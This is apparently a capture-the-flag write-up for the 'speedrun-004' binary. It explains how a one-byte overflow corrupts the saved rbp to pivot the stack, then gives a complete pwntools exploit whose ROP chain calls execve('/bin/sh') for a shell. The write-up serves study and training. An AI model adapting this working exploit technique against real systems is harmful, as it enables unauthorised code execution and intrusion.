# Speedrun4  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/bb0a6084-d2e3-4ffb-86c4-66c7d8c80556)  

Let's see what happens when we run it  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/475323c1-01a6-490d-9530-2bc0624aeac2)  
Hm, the program gets interrupted after a few seconds... there must be something going on with a SIGALARM.  

Let's look at the binary in Ghidra to figure out what is going on. Note that since this binary is statically linked and stripped, we will have no symbols on anything including libc functions.  
I have already labeled most of the functions for better readability, but I'll provide the reasoning behind as I go.  

```c
main(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,undefined8 param_5,
    undefined8 param_6)

{
  long lVar1;
  
  FUN_00410e30(PTR_DAT_006b97a0,0,2,0,param_5,param_6,param_2);
  lVar1 = FUN_0040e840("DEBUG");
  if (lVar1 == 0) {
    set_alarm(5);
  }
  print_sum();
  stuff_happens_here();
  print_sum2();
  return 0;
}
```
The set alarm function I guessed by context and also by timing the amount of time it took for the program to SIGALARM.  
**TIP: at this point I decided to patch out the call to `set_alarm` to make debugging easier. You can do this in Ghidra.**  
Both `print_sum` functions, just call puts. Let's look at `stuff_happens_here`  

```c
void stuff_happens_here(void)

{
  char buf [9];
  undefined local_d;
  int how_much;
  
  puts("how much do you have to say?");
  read(0,buf,9);
  local_d = 0;
  how_much = atoi(buf);
  if (how_much < 1) {
    puts("That\'s not much to say.");
  }
  else if (how_much < 0x102) {
    vuln_func(how_much);
  }
  else {
    puts("That\'s too much to say!.");
  }
  return;
}

void vuln_func(int how_much)

{
  undefined buf [256];
  
  buf[0] = 0;
  puts("Ok, what do you have to say for yourself?");
  read(0,buf,(long)how_much);
  printf("Interesting thought \"%s\", I\'ll take it into consideration.\n",buf);
  return;
}
```
`read` and `atoi` I just labelled by context and also by looking at their function signatures. Notice that the first `read` is safe. However, we can pass 0x101 and then `vuln_func` will read 0x101 bytes into a 0x100 buffer.  
That means that we can overwrite the last byte of the saved `rbp`.


Ok, what can we do with that? Well, conveniently the disassembly looks like this.
```
                             LAB_00400c3a                                    XREF[1]:     00400c2a(j)  
        00400c3a 8b 45 fc        MOV        EAX,dword ptr [RBP + how_much]
        00400c3d 89 c7           MOV        EDI,EAX
        00400c3f e8 2f ff        CALL       vuln_func                                        undefined vuln_func(undefined4 h
                 ff ff
                             LAB_00400c44                                    XREF[2]:     00400c21(j), 00400c38(j)  
        00400c44 c9              LEAVE
        00400c45 c3              RET
```
Why is this important?  
Due to the way that function prologues and epilogues work, rbp and rsp depend on each other. 

```
| rbp --> saved rbp  |
|     return addr    |
```
The value that we return to is `rbp+8` (64 bit binary)

On the first return we can corrupt the saved `rbp`. Therefore we control `rbp`
Then we return again immediately. Since we control `rbp` we also control which pointer we return to.  

We can then redirect to a ROPCHAIN that we have on the stack.  
Since we are dealing with ASLR, we can try to maximize our chances of landing in our ROPCHAIN by overflowing the last byte of rbp with `0x00` and then having a RETSLED (I made it up)  
A RETSLED is a NOPSLED but with RET :)  

So, heres how our payload would look like
` | retsled | ropchain | 0x00 | `  
Our plan is that the corrupted rbp will result in us landing somewhere in our retsled which will eventually reach our ROPCHAIN.  

```python
#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'speedrun-004')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# plan is:
# 1: corrupt last byte of rbp so that we control rsp on next ret
# since we have two ret in a row, we can control next rbp which lets us control next rsp
# next ret => prev rbp+8
# 2: point rsp to ropchain in stack

how_much = b"257" #how much do you have to say?
io.sendline(how_much)

tot = 256
data_section = p64(0x6bc000)

ret = p64(0x0000000000400416)
syscall = p64(0x000000000040132c)
pop_rax_ret = p64(0x0000000000415f04)
pop_rdi_ret = p64(0x0000000000400686)
pop_rsi_ret = p64(0x0000000000410a93)
pop_rdx_ret = p64(0x000000000044c6b6)
mov_qword_ptr_rdi_rsi_ret = p64(0x000000000044788b)

'''
rax = 59 (execve)
rdi = ptr to '/bin/sh'
rsi = 0
rdx = 0
'''
ropchain = (pop_rdi_ret + data_section
            + pop_rsi_ret + p64(int.from_bytes(b'/bin/sh','little'))
            + mov_qword_ptr_rdi_rsi_ret # write binsh to memory
            + pop_rax_ret + p64(59)
            + pop_rsi_ret + p64(0)
            + pop_rdx_ret + p64(0)
            + syscall
)

retsled =  (tot-len(ropchain))//8 * ret  

payload = retsled + ropchain + b'\x00'

io.send(payload)

io.interactive()
```
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c29b93a3-1b24-4926-812d-71319e08d462)





